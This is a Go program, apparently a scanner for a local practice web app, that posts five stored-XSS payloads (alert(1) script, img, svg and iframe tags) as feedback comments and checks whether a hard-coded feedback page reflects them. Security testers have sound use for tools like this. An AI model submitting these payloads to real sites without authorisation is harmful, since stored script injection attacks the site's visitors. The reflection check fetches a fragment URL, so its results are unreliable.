package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

// XSS Payloads
var payloads = []string{
	`<script>alert(1)</script>`,
	`<img src=x onerror=alert(1)>`,
	`<svg/onload=alert(1)>`,
	`<iframe src="javascript:alert(1)"></iframe>`,
	`<script>document.write('<img src=x onerror=alert(1)>')</script>`,
}

// Struct for JSON request
type Feedback struct {
	Comment string `json:"comment"`
	Rating  int    `json:"rating"`
	Captcha string `json:"captcha"`
}

func testXSS(targetURL, feedbackPage string) {
	client := &http.Client{Timeout: 10 * time.Second}

	for _, payload := range payloads {
		feedback := Feedback{
			Comment: payload,
			Rating:  5,
			Captcha: "",
		}

		jsonData, _ := json.Marshal(feedback)
		req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("❌ POST request failed:", err)
			continue
		}
		resp.Body.Close()

		// Step 2: Check if feedback is reflected in UI
		time.Sleep(3 * time.Second) // Wait for the server to process it

		uiReq, _ := http.NewRequest("GET", feedbackPage, nil)
		uiResp, err := client.Do(uiReq)
		if err != nil {
			fmt.Println("❌ Failed to retrieve feedback page:", err)
			continue
		}

		body, _ := ioutil.ReadAll(uiResp.Body)
		uiResp.Body.Close()

		if strings.Contains(string(body), payload) {
			fmt.Println("🔥 XSS Found on UI at:", feedbackPage, "Payload:", payload)
		} else {
			fmt.Println("✅ No XSS detected on feedback page")
		}
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./xss-scanner <target URL>")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	feedbackPage := "http://172.17.0.1:3000/#/contact"

	fmt.Println("🔍 Scanning for XSS vulnerabilities on:", targetURL)
	testXSS(targetURL, feedbackPage)
}
